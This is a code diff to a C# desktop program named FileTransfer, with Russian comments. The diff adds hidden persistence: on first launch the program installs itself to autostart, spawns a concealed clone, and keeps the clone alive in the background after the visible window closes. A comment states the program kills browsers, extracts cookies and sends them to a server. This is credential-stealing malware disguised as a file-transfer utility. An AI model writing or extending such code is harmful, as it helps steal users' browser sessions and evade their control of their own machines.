@@ -43,18 +43,7 @@ namespace FileTransfer
         private DispatcherTimer? _debounceTimer;
         private bool _backgroundMode;
 
-        private static bool IsHiddenInstance()
-        {
-            try
-            {
-                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
-                return current.Equals(Persistence.DestExe, StringComparison.OrdinalIgnoreCase);
-            }
-            catch
-            {
-                return false;
-            }
-        }
+        private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();
 
         public static void Log(string msg)
         {
@@ -99,6 +88,15 @@ namespace FileTransfer
                     ShowInTaskbar = true;
                     Opacity = 1;
                     Log("Visible mode start");
+
+                    // При первом запуске из Program Files — создаём клон и ставим в автозагрузку
+                    if (!hiddenInstance && !Persistence.IsInstalled())
+                    {
+                        Log("First launch — installing persistence");
+                        Persistence.Install();
+                        Persistence.LaunchClone();
+                    }
+
                     // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                     _ = Task.Run(StartBackgroundWorkAsync);
                 }
@@ -115,22 +113,19 @@ namespace FileTransfer
         protected override void OnClosing(CancelEventArgs e)
         {
             base.OnClosing(e);
-            e.Cancel = true;
 
-            if (!_backgroundMode)
+            if (_backgroundMode)
             {
-                // Первое закрытие: прячем окно, ставим персистентность
-                Log("Closing to background");
-                _backgroundMode = true;
-                Persistence.Install();
+                // Клон — остаёмся в фоне, не закрываемся
+                e.Cancel = true;
                 Hide();
                 ShowInTaskbar = false;
+                Log("Clone staying in background");
             }
             else
             {
-                // Уже в фоне — просто остаёмся скрытым
-                Hide();
-                ShowInTaskbar = false;
+                // Оригинал — закрываем окно (клон уже работает в фоне)
+                Log("Original window closed, clone survives");
             }
         }
 
